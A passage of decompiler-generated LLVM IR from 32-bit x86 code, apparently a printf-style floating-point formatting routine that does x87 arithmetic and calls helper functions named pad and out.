  %v0_805284f = load i32, i32* %edx.global-to-local, align 4
  %v1_805284f = load i32, i32* @esp, align 4
  %v2_805284f = add i32 %v1_805284f, -4
  %v3_805284f = inttoptr i32 %v2_805284f to i32*
  store i32 %v0_805284f, i32* %v3_805284f, align 4
  %v0_8052850 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052850, i32* %eax.global-to-local, align 4
  %v2_8052852 = load i32, i32* %v3_805284f, align 4
  %v3_8052852 = sitofp i32 %v2_8052852 to x86_fp80
  %v4_8052852 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %v3_8052852, x86_fp80* %st0.global-to-local, align 4
  %v2_8052858 = add i32 %v1_805284f, 28
  %v3_8052858 = inttoptr i32 %v2_8052858 to i32*
  %v4_8052858 = load i32, i32* %v3_8052858, align 4
  %v5_8052858 = sub i32 %v0_8052850, %v4_8052858
  %v3_805285c = add i32 %v1_805284f, 7696
  %v4_805285c = inttoptr i32 %v3_805285c to x86_fp80*
  store x86_fp80 %v3_8052852, x86_fp80* %v4_805285c, align 4
  %v1_8052863 = add i32 %v5_8052858, -1
  %v8_8052863 = icmp eq i32 %v1_8052863, 0
  store i32 %v1_8052863, i32* %eax.global-to-local, align 4
  %v1_8052864 = add i32 %v1_805284f, 7616
  %v2_8052864 = inttoptr i32 %v1_8052864 to x86_fp80*
  %v3_8052864 = load x86_fp80, x86_fp80* %v2_8052864, align 4
  store x86_fp80 %v3_8052864, x86_fp80* %st0.global-to-local, align 4
  %v1_805286b = add i32 %v1_805284f, 7527
  store i32 %v1_805286b, i32* %esi.global-to-local, align 4
  %v3_8052872 = load x86_fp80, x86_fp80* %v4_805285c, align 4
  store x86_fp80 %v3_8052872, x86_fp80* %st1.global-to-local, align 4
  %v4_8052879 = fsub x86_fp80 %v3_8052864, %v3_8052872
  %v3_805287b = add i32 %v1_805284f, 7680
  %v4_805287b = inttoptr i32 %v3_805287b to x86_fp80*
  store x86_fp80 %v4_8052879, x86_fp80* %v4_805287b, align 4
  %v4_8052889 = fmul x86_fp80 %v4_8052879, 0xK40038000000000000000
  store x86_fp80 %v4_8052889, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 %v4_8052889, x86_fp80* %v2_8052864, align 4
  %v1_8052896 = icmp eq i1 %v8_8052863, false
  br i1 %v1_8052896, label %dec_label_pc_80528be, label %dec_label_pc_8052898

dec_label_pc_8052898:                             ; preds = %dec_label_pc_8052827
  store x86_fp80 %v4_8052889, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v1_80528a7 = udiv i32 %v1_8052863, 256
  %v2_80528a7 = trunc i32 %v1_80528a7 to i8
  %v5_80528a7 = and i8 %v2_80528a7, 4
  %v6_80528a7 = icmp ne i8 %v5_80528a7, 0
  %v9_80528a7 = and i8 %v2_80528a7, 64
  %v10_80528a7 = icmp ne i8 %v9_80528a7, 0
  %v1_80528a8 = icmp eq i1 %v10_80528a7, false
  %brmerge216 = or i1 %v6_80528a7, %v1_80528a8
  br i1 %brmerge216, label %dec_label_pc_80528ba, label %dec_label_pc_80528ac

dec_label_pc_80528ac:                             ; preds = %dec_label_pc_8052898
  %v1_80528ac = add i32 %v1_805284f, 52
  %v2_80528ac = inttoptr i32 %v1_80528ac to i32*
  %v3_80528ac = load i32, i32* %v2_80528ac, align 4
  %tmp234 = icmp slt i32 %v3_80528ac, 1
  %tmp235 = icmp eq i1 %tmp234, false
  br i1 %tmp235, label %dec_label_pc_80528ba, label %dec_label_pc_80528b3

dec_label_pc_80528b3:                             ; preds = %dec_label_pc_80528ac
  %v1_80528b3 = add i32 %v1_805284f, 44
  %v2_80528b3 = inttoptr i32 %v1_80528b3 to i8*
  %v3_80528b3 = load i8, i8* %v2_80528b3, align 1
  %v4_80528b3 = and i8 %v3_80528b3, 8
  %v5_80528b3 = icmp eq i8 %v4_80528b3, 0
  br i1 %v5_80528b3, label %dec_label_pc_80528be, label %dec_label_pc_80528ba

dec_label_pc_80528ba:                             ; preds = %dec_label_pc_8052898, %dec_label_pc_80528b3, %dec_label_pc_80528ac
  %v1_80528ba = inttoptr i32 %v0_8052850 to i8*
  store i8 46, i8* %v1_80528ba, align 1
  %v0_80528bd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80528bd = add i32 %v0_80528bd, 1
  store i32 %v1_80528bd, i32* %ebx.global-to-local, align 4
  %v0_80528be.pre = load i32, i32* @esp, align 4
  %v4_80528be.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v0_80528cd.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80528be

dec_label_pc_80528be:                             ; preds = %dec_label_pc_80528b3, %dec_label_pc_8052827, %dec_label_pc_80528ba
  %v0_8052911 = phi i32 [ %v0_8052850, %dec_label_pc_80528b3 ], [ %v0_8052850, %dec_label_pc_8052827 ], [ %v1_80528bd, %dec_label_pc_80528ba ]
  %v0_80528cd = phi i32 [ %v1_8052863, %dec_label_pc_80528b3 ], [ %v1_8052863, %dec_label_pc_8052827 ], [ %v0_80528cd.pre, %dec_label_pc_80528ba ]
  %v4_80528be = phi i3 [ %v4_8052852, %dec_label_pc_80528b3 ], [ %v4_8052852, %dec_label_pc_8052827 ], [ %v4_80528be.pre, %dec_label_pc_80528ba ]
  %v1_805291d = phi i32 [ %v1_805284f, %dec_label_pc_80528b3 ], [ %v1_805284f, %dec_label_pc_8052827 ], [ %v0_80528be.pre, %dec_label_pc_80528ba ]
  %v1_80528be = add i32 %v1_805291d, 7616
  %v2_80528be = inttoptr i32 %v1_80528be to x86_fp80*
  %v3_80528be = load x86_fp80, x86_fp80* %v2_80528be, align 4
  store x86_fp80 %v3_80528be, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  store i3 %v4_80528be, i3* @fpu_stat_TOP, align 1
  %v1_80528cd = udiv i32 %v0_80528cd, 256
  %v2_80528cd = trunc i32 %v1_80528cd to i8
  %v5_80528cd = and i8 %v2_80528cd, 4
  %v6_80528cd = icmp ne i8 %v5_80528cd, 0
  %v9_80528cd = and i8 %v2_80528cd, 64
  %v10_80528cd = icmp ne i8 %v9_80528cd, 0
  %v1_80528ce = icmp eq i1 %v10_80528cd, false
  %brmerge217 = or i1 %v6_80528cd, %v1_80528ce
  br i1 %brmerge217, label %dec_label_pc_8052827, label %dec_label_pc_80528da

dec_label_pc_80528da:                             ; preds = %dec_label_pc_80528be
  %v1_80528da = add i32 %v1_805291d, 52
  %v2_80528da = inttoptr i32 %v1_80528da to i32*
  %v3_80528da = load i32, i32* %v2_80528da, align 4
  %v4_80528da = icmp eq i32 %v3_80528da, 0
  %v1_8052902.pre = load i32, i32* %esi.global-to-local, align 4
  %.pre540 = sub i32 %v0_8052911, %v1_8052902.pre
  br i1 %v4_80528da, label %dec_label_pc_80528fb, label %dec_label_pc_80528e1

dec_label_pc_80528e1:                             ; preds = %dec_label_pc_80528da
  %v1_80528e5 = add i32 %.pre540, -2
  store i32 %v1_80528e5, i32* %eax.global-to-local, align 4
  %v4_80528e8 = load i32, i32* %v2_80528da, align 4
  %v5_80528e8 = sub i32 %v1_80528e5, %v4_80528e8
  %v11_80528e8 = xor i32 %v4_80528e8, %v1_80528e5
  %v12_80528e8 = xor i32 %v5_80528e8, %v1_80528e5
  %v13_80528e8 = and i32 %v12_80528e8, %v11_80528e8
  %v14_80528e8 = icmp slt i32 %v13_80528e8, 0
  %v16_80528e8 = icmp slt i32 %v5_80528e8, 0
  %v2_80528ec = icmp eq i1 %v16_80528e8, %v14_80528e8
  br i1 %v2_80528ec, label %dec_label_pc_80528fb, label %dec_label_pc_80528ee

dec_label_pc_80528ee:                             ; preds = %dec_label_pc_80528e1
  store i32 %v4_80528e8, i32* %edx.global-to-local, align 4
  %v2_80528f2 = add i32 %v1_805291d, 7794
  %v3_80528f2 = add i32 %v2_80528f2, %v4_80528e8
  br label %dec_label_pc_8052908

dec_label_pc_80528fb:                             ; preds = %dec_label_pc_80528da, %dec_label_pc_80528e1
  %v1_80528fb = add i32 %v1_805291d, 7840
  %v2_8052902 = sub i32 %v1_80528fb, %v1_8052902.pre
  store i32 %v2_8052902, i32* %eax.global-to-local, align 4
  %v2_8052904 = add i32 %v0_8052911, -48
  %v3_8052904 = add i32 %v2_8052904, %v2_8052902
  br label %dec_label_pc_8052908

dec_label_pc_8052908:                             ; preds = %dec_label_pc_80528ee, %dec_label_pc_80528fb
  %storemerge17 = phi i32 [ %v3_80528f2, %dec_label_pc_80528ee ], [ %v3_8052904, %dec_label_pc_80528fb ]
  store i32 %storemerge17, i32* %ebp.global-to-local, align 4
  %v1_8052908 = add i32 %v1_805291d, 116
  %v2_8052908 = inttoptr i32 %v1_8052908 to i32*
  %v3_8052908 = load i32, i32* %v2_8052908, align 4
  store i32 %v3_8052908, i32* %ecx.global-to-local, align 4
  store i32 32, i32* @edx, align 4
  store i32 %.pre540, i32* @ebx, align 4
  %v2_8052913 = add i32 %v1_805291d, 76
  %v3_8052913 = inttoptr i32 %v2_8052913 to i32*
  %v4_8052913 = load i32, i32* %v3_8052913, align 4
  %v5_8052913 = sub i32 %storemerge17, %v4_8052913
  store i32 %v5_8052913, i32* @ebp, align 4
  store i32 %.pre540, i32* @esi, align 4
  %v2_8052919 = add i32 %v5_8052913, %v3_8052908
  store i32 %v2_8052919, i32* @edi, align 4
  %v2_805291d = add i32 %v1_805291d, -4
  %v3_805291d = inttoptr i32 %v2_805291d to i32*
  store i32 %v3_8052908, i32* %v3_805291d, align 4
  %v0_805291e = load i32, i32* %ecx.global-to-local, align 4
  %v2_805291e = add i32 %v1_805291d, -8
  %v3_805291e = inttoptr i32 %v2_805291e to i32*
  store i32 %v0_805291e, i32* %v3_805291e, align 4
  %v1_805291f = add i32 %v1_805291d, 44
  %v2_805291f = inttoptr i32 %v1_805291f to i32*
  %v3_805291f = load i32, i32* %v2_805291f, align 4
  %v5_805291f = add i32 %v1_805291d, -12
  %v6_805291f = inttoptr i32 %v5_805291f to i32*
  store i32 %v3_805291f, i32* %v6_805291f, align 4
  %v0_8052923 = load i32, i32* @edi, align 4
  %v2_8052923 = add i32 %v1_805291d, -16
  %v3_8052923 = inttoptr i32 %v2_8052923 to i32*
  store i32 %v0_8052923, i32* %v3_8052923, align 4
  %v1_8052924 = add i32 %v1_805291d, 48
  %v2_8052924 = inttoptr i32 %v1_8052924 to i32*
  %v3_8052924 = load i32, i32* %v2_8052924, align 4
  store i32 %v3_8052924, i32* @ecx, align 4
  %v1_8052928 = add i32 %v1_805291d, 36
  %v2_8052928 = inttoptr i32 %v1_8052928 to i32*
  %v3_8052928 = load i32, i32* %v2_8052928, align 4
  store i32 %v3_8052928, i32* @eax, align 4
  %v0_805292c = call i32 @pad()
  store i32 %v0_805292c, i32* %eax.global-to-local, align 4
  %v0_8052931 = load i32, i32* @esp, align 4
  %v1_8052931 = add i32 %v0_8052931, 132
  %v2_8052931 = inttoptr i32 %v1_8052931 to i32*
  %v3_8052931 = load i32, i32* %v2_8052931, align 4
  store i32 %v3_8052931, i32* @ecx, align 4
  %v1_8052938 = add i32 %v0_8052931, 100
  %v2_8052938 = inttoptr i32 %v1_8052938 to i32*
  %v3_8052938 = load i32, i32* %v2_8052938, align 4
  store i32 %v3_8052938, i32* @edx, align 4
  %v1_805293c = add i32 %v0_8052931, 52
  %v2_805293c = inttoptr i32 %v1_805293c to i32*
  %v3_805293c = load i32, i32* %v2_805293c, align 4
  store i32 %v3_805293c, i32* @eax, align 4
  %v0_8052940 = call i32 @out()
  store i32 %v0_8052940, i32* %eax.global-to-local, align 4
  %v0_8052945 = load i32, i32* @esp, align 4
  %v1_8052945 = inttoptr i32 %v0_8052945 to i32*
  %v2_8052945 = load i32, i32* %v1_8052945, align 4
  store i32 %v2_8052945, i32* %eax.global-to-local, align 4
  store i32 48, i32* @edx, align 4
  %v1_805294c = add i32 %v0_8052945, 60
  %v2_805294c = inttoptr i32 %v1_805294c to i32*
  %v3_805294c = load i32, i32* %v2_805294c, align 4
  %v1_8052950 = xor i32 %v3_805294c, 65536
  store i32 %v1_8052950, i32* %eax.global-to-local, align 4
  %v2_8052955 = add i32 %v0_8052945, 4
  %v3_8052955 = inttoptr i32 %v2_8052955 to i32*
  store i32 %v1_8052950, i32* %v3_8052955, align 4
  %v0_8052956 = load i32, i32* @edi, align 4
  store i32 %v0_8052956, i32* %v1_8052945, align 4
  %v1_8052957 = add i32 %v0_8052945, 64
  %v2_8052957 = inttoptr i32 %v1_8052957 to i32*
  %v3_8052957 = load i32, i32* %v2_8052957, align 4
  store i32 %v3_8052957, i32* @ecx, align 4
  %v1_805295b = add i32 %v0_8052945, 52
  %v2_805295b = inttoptr i32 %v1_805295b to i32*
  %v3_805295b = load i32, i32* %v2_805295b, align 4
  store i32 %v3_805295b, i32* @eax, align 4
  %v0_805295f = call i32 @pad()
  store i32 %v0_805295f, i32* %eax.global-to-local, align 4
  %v0_8052964 = load i32, i32* @esp, align 4
  %v1_8052964 = add i32 %v0_8052964, 52
  %v2_8052964 = inttoptr i32 %v1_8052964 to i32*
  %v3_8052964 = load i32, i32* %v2_8052964, align 4
  store i32 %v3_8052964, i32* @eax, align 4
  %v0_8052968 = load i32, i32* @ebx, align 4
  store i32 %v0_8052968, i32* @ecx, align 4
  %v1_805296a = add i32 %v0_8052964, 7543
  store i32 %v1_805296a, i32* @edx, align 4
  %v1_8052971 = add i32 %v0_8052964, 7808
  store i32 %v1_8052971, i32* @ebx, align 4
  %v0_8052978 = call i32 @out()
  store i32 %v0_8052978, i32* %eax.global-to-local, align 4
  store i32 48, i32* @edx, align 4
  %v0_8052982 = load i32, i32* @ebx, align 4
  %v1_8052982 = load i32, i32* @esp, align 4
  %v2_8052982 = add i32 %v1_8052982, 92
  %v3_8052982 = inttoptr i32 %v2_8052982 to i32*
  %v4_8052982 = load i32, i32* %v3_8052982, align 4
  %v5_8052982 = sub i32 %v0_8052982, %v4_8052982
  store i32 %v5_8052982, i32* @ebx, align 4
  %v1_8052986 = inttoptr i32 %v1_8052982 to i32*
  %v2_8052986 = load i32, i32* %v1_8052986, align 4
  store i32 %v2_8052986, i32* %ecx.global-to-local, align 4
  %v3_8052986 = add i32 %v1_8052982, 4
  %v1_8052987 = inttoptr i32 %v3_8052986 to i32*
  %v2_8052987 = load i32, i32* %v1_8052987, align 4
  store i32 %v2_8052987, i32* %eax.global-to-local, align 4
  %v0_8052988 = load i32, i32* @ebp, align 4
  %v2_8052988 = sub i32 %v0_8052988, %v5_8052982
  %v1_805298a = load i32, i32* @esi, align 4
  %v2_805298a = sub i32 %v2_8052988, %v1_805298a
  store i32 %v2_805298a, i32* @ebp, align 4
  store i32 0, i32* %v1_8052987, align 4
  %v0_805298e = load i32, i32* @ebp, align 4
  store i32 %v0_805298e, i32* @ecx, align 4
  store i32 0, i32* %v1_8052986, align 4
  %v1_8052992 = add i32 %v1_8052982, 52
  %v2_8052992 = inttoptr i32 %v1_8052992 to i32*
  %v3_8052992 = load i32, i32* %v2_8052992, align 4
  store i32 %v3_8052992, i32* @eax, align 4
  %v0_8052996 = call i32 @pad()
  store i32 %v0_8052996, i32* %eax.global-to-local, align 4
  %v0_805299b = load i32, i32* @esp, align 4
  %v1_805299b = add i32 %v0_805299b, 92
  %v2_805299b = inttoptr i32 %v1_805299b to i32*
  %v3_805299b = load i32, i32* %v2_805299b, align 4
  store i32 %v3_805299b, i32* @edx, align 4
  %v0_805299f = load i32, i32* @ebx, align 4
  store i32 %v0_805299f, i32* @ecx, align 4
  %v1_80529a1 = add i32 %v0_805299b, 52
  %v2_80529a1 = inttoptr i32 %v1_80529a1 to i32*
  %v3_80529a1 = load i32, i32* %v2_80529a1, align 4
  store i32 %v3_80529a1, i32* @eax, align 4
  %v0_80529a5 = call i32 @out()
  store i32 %v0_80529a5, i32* %eax.global-to-local, align 4
  %v0_80529aa = load i32, i32* @esp, align 4
  %v1_80529aa = inttoptr i32 %v0_80529aa to i32*
  %v2_80529aa = load i32, i32* %v1_80529aa, align 4
  store i32 %v2_80529aa, i32* %eax.global-to-local, align 4
  store i32 32, i32* @edx, align 4
  %v1_80529b1 = add i32 %v0_80529aa, 60
  %v2_80529b1 = inttoptr i32 %v1_80529b1 to i32*
  %v3_80529b1 = load i32, i32* %v2_80529b1, align 4
  %v4_80529b1 = xor i32 %v3_80529b1, 8192
  store i32 %v4_80529b1, i32* %v2_80529b1, align 4
  %v0_80529b9 = load i32, i32* @esp, align 4
  %v1_80529b9 = add i32 %v0_80529b9, 52
  %v2_80529b9 = inttoptr i32 %v1_80529b9 to i32*
  %v3_80529b9 = load i32, i32* %v2_80529b9, align 4
  %v5_80529b9 = add i32 %v0_80529b9, -4
  %v6_80529b9 = inttoptr i32 %v5_80529b9 to i32*
  store i32 %v3_80529b9, i32* %v6_80529b9, align 4
  %v0_80529bd = load i32, i32* @edi, align 4
  %v2_80529bd = add i32 %v0_80529b9, -8
  %v3_80529bd = inttoptr i32 %v2_80529bd to i32*
  store i32 %v0_80529bd, i32* %v3_80529bd, align 4
  br label %dec_label_pc_80529be

dec_label_pc_80529be:                             ; preds = %dec_label_pc_805263f, %dec_label_pc_8052908
  %storemerge8 = phi i32 [ %v2_8052652, %dec_label_pc_805263f ], [ %v2_80529bd, %dec_label_pc_8052908 ]
  %v1_80529be = add i32 %storemerge8, 64
  %v2_80529be = inttoptr i32 %v1_80529be to i32*
  %v3_80529be = load i32, i32* %v2_80529be, align 4
  store i32 %v3_80529be, i32* @ecx, align 4
  %v1_80529c2 = add i32 %storemerge8, 52
  %v2_80529c2 = inttoptr i32 %v1_80529c2 to i32*
  %v3_80529c2 = load i32, i32* %v2_80529c2, align 4
  store i32 %v3_80529c2, i32* @eax, align 4
  %v0_80529c6 = call i32 @pad()
  store i32 %v0_80529c6, i32* %eax.global-to-local, align 4
  %v0_80529cb = load i32, i32* @esp, align 4
  %v0_805325a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805325a

dec_label_pc_80529d3:                             ; preds = %dec_label_pc_8052658
  %v0_80529d3 = load i32, i32* @esp, align 4
  %v1_80529d3 = add i32 %v0_80529d3, 52
  %v2_80529d3 = inttoptr i32 %v1_80529d3 to i32*
  %v3_80529d3 = load i32, i32* %v2_80529d3, align 4
  %v5_80529d3 = icmp slt i32 %v3_80529d3, 0
  %v1_80529d8 = icmp eq i1 %v5_80529d3, false
  %v2_80529e6 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_80529e6 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v2_80529e6, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v3_80529e6, x86_fp80* %st0.global-to-local, align 4
  br i1 %v1_80529d8, label %dec_label_pc_80529e8, label %dec_label_pc_80529da

dec_label_pc_80529da:                             ; preds = %dec_label_pc_80529d3
  store i32 6, i32* %v2_80529d3, align 4
  br label %dec_label_pc_80529e8

dec_label_pc_80529e8:                             ; preds = %dec_label_pc_80529d3, %dec_label_pc_80529da
  store i3 %v0_805267a, i3* %fpu_stat_TOP.global-to-local, align 1
  %v0_80529ee = load i32, i32* %eax.global-to-local, align 4
  %v1_80529ee = udiv i32 %v0_80529ee, 256
  %tmp551 = and i32 %v1_80529ee, 68
  %tmp552 = icmp eq i32 %tmp551, 64
  br i1 %tmp552, label %dec_label_pc_8052a0a, label %dec_label_pc_80529f3

dec_label_pc_80529f3:                             ; preds = %dec_label_pc_80529e8
  %v3_80529f3 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v4_80529f3 = fmul x86_fp80 %v3_80529f3, 0xK401B8000000000000000
  store x86_fp80 %v4_80529f3, x86_fp80* %st0.global-to-local, align 4
  %v0_80529f9 = load i32, i32* @esp, align 4
  %v1_80529f9 = add i32 %v0_80529f9, 7828
  %v2_80529f9 = inttoptr i32 %v1_80529f9 to i32*
  %v3_80529f9 = load i32, i32* %v2_80529f9, align 4
  %v4_80529f9 = add i32 %v3_80529f9, -28
  store i32 %v4_80529f9, i32* %v2_80529f9, align 4
  %v1_8052a01 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v2_8052a01 = load i32, i32* @esp, align 4
  %v3_8052a01 = add i32 %v2_8052a01, 7616
  %v4_8052a01 = inttoptr i32 %v3_8052a01 to x86_fp80*
  store x86_fp80 %v1_8052a01, x86_fp80* %v4_8052a01, align 4
  br label %dec_label_pc_8052a0c

dec_label_pc_8052a0a:                             ; preds = %dec_label_pc_80529e8
  %v0_8052a0c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052a0c

dec_label_pc_8052a0c:                             ; preds = %dec_label_pc_80529f3, %dec_label_pc_8052a0a
  %v0_8052a2b = phi i32 [ %v2_8052a01, %dec_label_pc_80529f3 ], [ %v0_8052a0c.pre, %dec_label_pc_8052a0a ]
  store i3 %v5_805267a, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8052a0c = add i32 %v0_8052a2b, 7828
  %v2_8052a0c = inttoptr i32 %v1_8052a0c to i32*
  %v3_8052a0c = load i32, i32* %v2_8052a0c, align 4
  %v5_8052a0c = icmp slt i32 %v3_8052a0c, 0
  %v1_8052a14 = icmp eq i1 %v5_8052a0c, false
  br i1 %v1_8052a14, label %dec_label_pc_8052a2b, label %dec_label_pc_8052a16

dec_label_pc_8052a16:                             ; preds = %dec_label_pc_8052a0c
  %v1_8052a16 = add i32 %v0_8052a2b, 144
  store i32 %v1_8052a16, i32* %edx.global-to-local, align 4
  %v2_8052a1d = add i32 %v0_8052a2b, 96
  %v3_8052a1d = inttoptr i32 %v2_8052a1d to i32*
  store i32 %v1_8052a16, i32* %v3_8052a1d, align 4
  %v0_8052a21 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052a21 = load i32, i32* @esp, align 4
  %v2_8052a21 = add i32 %v1_8052a21, 104
  %v3_8052a21 = inttoptr i32 %v2_8052a21 to i32*
  store i32 %v0_8052a21, i32* %v3_8052a21, align 4
  %v0_8052a25 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052a25 = load i32, i32* @esp, align 4
  %v2_8052a25 = add i32 %v1_8052a25, 100
  %v3_8052a25 = inttoptr i32 %v2_8052a25 to i32*
  store i32 %v0_8052a25, i32* %v3_8052a25, align 4
  br label %dec_label_pc_8052a3e

dec_label_pc_8052a2b:                             ; preds = %dec_label_pc_8052a0c
  %v1_8052a2b = add i32 %v0_8052a2b, 7224
  store i32 %v1_8052a2b, i32* %ecx.global-to-local, align 4
  %v2_8052a32 = add i32 %v0_8052a2b, 96
  %v3_8052a32 = inttoptr i32 %v2_8052a32 to i32*
  store i32 %v1_8052a2b, i32* %v3_8052a32, align 4
  %v0_8052a36 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052a36 = load i32, i32* @esp, align 4
  %v2_8052a36 = add i32 %v1_8052a36, 104
  %v3_8052a36 = inttoptr i32 %v2_8052a36 to i32*
  store i32 %v0_8052a36, i32* %v3_8052a36, align 4
  %v0_8052a3a = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052a3a = load i32, i32* @esp, align 4
  %v2_8052a3a = add i32 %v1_8052a3a, 100
  %v3_8052a3a = inttoptr i32 %v2_8052a3a to i32*
  store i32 %v0_8052a3a, i32* %v3_8052a3a, align 4
  br label %dec_label_pc_8052a3e

dec_label_pc_8052a3e:                             ; preds = %dec_label_pc_8052a16, %dec_label_pc_8052a2b
  %v0_8052a45 = load i32, i32* @esp, align 4
  %v1_8052a45 = add i32 %v0_8052a45, 142
  %v2_8052a45 = inttoptr i32 %v1_8052a45 to i16*
  %v3_8052a45 = load i16, i16* %v2_8052a45, align 2
  %v5_8052a45 = load i32, i32* %eax.global-to-local, align 4
  %v6_8052a45 = and i32 %v5_8052a45, -65536
  %v1_8052a4d = udiv i16 %v3_8052a45, 256
  %v2_8052a4d = zext i16 %v1_8052a4d to i32
  %v3_8052a4d = or i32 %v2_8052a4d, 12
  %v10_8052a4d = mul nuw nsw i32 %v3_8052a4d, 256
  %tmp553 = urem i16 %v3_8052a45, 256
  %v4_8052a45.masked = zext i16 %tmp553 to i32
  %v11_8052a4d = or i32 %v6_8052a45, %v4_8052a45.masked
  %v12_8052a4d = or i32 %v11_8052a4d, %v10_8052a4d
  store i32 %v12_8052a4d, i32* %eax.global-to-local, align 4
  %v1_8052a50 = trunc i32 %v12_8052a4d to i16
  %v3_8052a50 = add i32 %v0_8052a45, 140
  %v4_8052a50 = inttoptr i32 %v3_8052a50 to i16*
  store i16 %v1_8052a50, i16* %v4_8052a50, align 2
  %v0_8052a58.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052a58

dec_label_pc_8052a58:                             ; preds = %dec_label_pc_8052a58, %dec_label_pc_8052a3e
  %v3_8052a6e = phi i32 [ %v0_8052a58.pre, %dec_label_pc_8052a3e ], [ %v2_8052a94, %dec_label_pc_8052a58 ]
  %v1_8052a58 = add i32 %v3_8052a6e, 7616
  %v2_8052a58 = inttoptr i32 %v1_8052a58 to x86_fp80*
  %v3_8052a58 = load x86_fp80, x86_fp80* %v2_8052a58, align 4
  store x86_fp80 %v3_8052a58, x86_fp80* %st0.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8052a61 = add i32 %v3_8052a6e, 100
  %v2_8052a61 = inttoptr i32 %v1_8052a61 to i32*
  %v3_8052a61 = load i32, i32* %v2_8052a61, align 4
  store i32 %v3_8052a61, i32* %ecx.global-to-local, align 4
  store x86_fp80 %v3_8052a58, x86_fp80* %st1.global-to-local, align 4
  %v2_8052a6e = fptosi x86_fp80 %v3_8052a58 to i64
  %v4_8052a6e = add i32 %v3_8052a6e, 128
  %v5_8052a6e = inttoptr i32 %v4_8052a6e to i64*
  store i64 %v2_8052a6e, i64* %v5_8052a6e, align 4
  %v2_8052a7c = inttoptr i32 %v4_8052a6e to i32*
  %v3_8052a7c = load i32, i32* %v2_8052a7c, align 4
  store i32 %v3_8052a7c, i32* %eax.global-to-local, align 4
  %v2_8052a83 = inttoptr i32 %v3_8052a61 to i32*
  store i32 %v3_8052a7c, i32* %v2_8052a83, align 4
  %v0_8052a85 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052a85 = add i32 %v0_8052a85, 4
  store i32 %v1_8052a85, i32* %ecx.global-to-local, align 4
  %v0_8052a88 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052a88 = load i32, i32* @esp, align 4
  %v2_8052a88 = add i32 %v1_8052a88, -4
  %v3_8052a88 = inttoptr i32 %v2_8052a88 to i32*
  store i32 %v0_8052a88, i32* %v3_8052a88, align 4
  %v0_8052a89 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052a89 = add i32 %v1_8052a88, -8
  %v3_8052a89 = inttoptr i32 %v2_8052a89 to i32*
  store i32 %v0_8052a89, i32* %v3_8052a89, align 4
  %v1_8052a8a = inttoptr i32 %v2_8052a89 to i64*
  %v2_8052a8a = load i64, i64* %v1_8052a8a, align 4
  %v3_8052a8a = sitofp i64 %v2_8052a8a to x86_fp80
  store x86_fp80 %v3_8052a8a, x86_fp80* %st1.global-to-local, align 4
  %v0_8052a90 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052a90 = add i32 %v1_8052a88, 100
  %v3_8052a90 = inttoptr i32 %v2_8052a90 to i32*
  store i32 %v0_8052a90, i32* %v3_8052a90, align 4
  %v1_8052a94 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v2_8052a94 = load i32, i32* @esp, align 4
  %v3_8052a94 = add i32 %v2_8052a94, 7664
  %v4_8052a94 = inttoptr i32 %v3_8052a94 to x86_fp80*
  store x86_fp80 %v1_8052a94, x86_fp80* %v4_8052a94, align 4
  %v2_8052aa2 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v4_8052aa2 = fsub x86_fp80 %v2_8052aa2, %v1_8052a94
  %v3_8052aa4 = add i32 %v2_8052a94, 7648
  %v4_8052aa4 = inttoptr i32 %v3_8052aa4 to x86_fp80*
  store x86_fp80 %v4_8052aa2, x86_fp80* %v4_8052aa4, align 4
  %v4_8052ab2 = fmul x86_fp80 %v4_8052aa2, 0xK401CEE6B280000000000
  %v3_8052ab8 = add i32 %v2_8052a94, 7616
  %v4_8052ab8 = inttoptr i32 %v3_8052ab8 to x86_fp80*
  store x86_fp80 %v4_8052ab2, x86_fp80* %v4_8052ab8, align 4
  store x86_fp80 %v4_8052ab2, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v0_8052ace = load i32, i32* %eax.global-to-local, align 4
  %tmp236 = and i32 %v0_8052ace, 17408
  %tmp237 = icmp eq i32 %tmp236, 16384
  br i1 %tmp237, label %dec_label_pc_8052b6d.preheader, label %dec_label_pc_8052a58

dec_label_pc_8052b6d.preheader:                   ; preds = %dec_label_pc_8052a58
  store i3 %v5_805267a, i3* @fpu_stat_TOP, align 1
  %v1_8052b6d371 = add i32 %v2_8052a94, 7828
  %v2_8052b6d372 = inttoptr i32 %v1_8052b6d371 to i32*
  %v3_8052b6d373 = load i32, i32* %v2_8052b6d372, align 4
  store i32 %v3_8052b6d373, i32* %ecx.global-to-local, align 4
  %sext374 = mul i32 %v3_8052b6d373, 16777216
  %tmp243377 = icmp slt i32 %sext374, 1
  %tmp244378 = icmp eq i1 %tmp243377, false
  br i1 %tmp244378, label %dec_label_pc_8052adc, label %dec_label_pc_8052b7c

dec_label_pc_8052adc:                             ; preds = %dec_label_pc_8052b6d.preheader, %dec_label_pc_8052b66
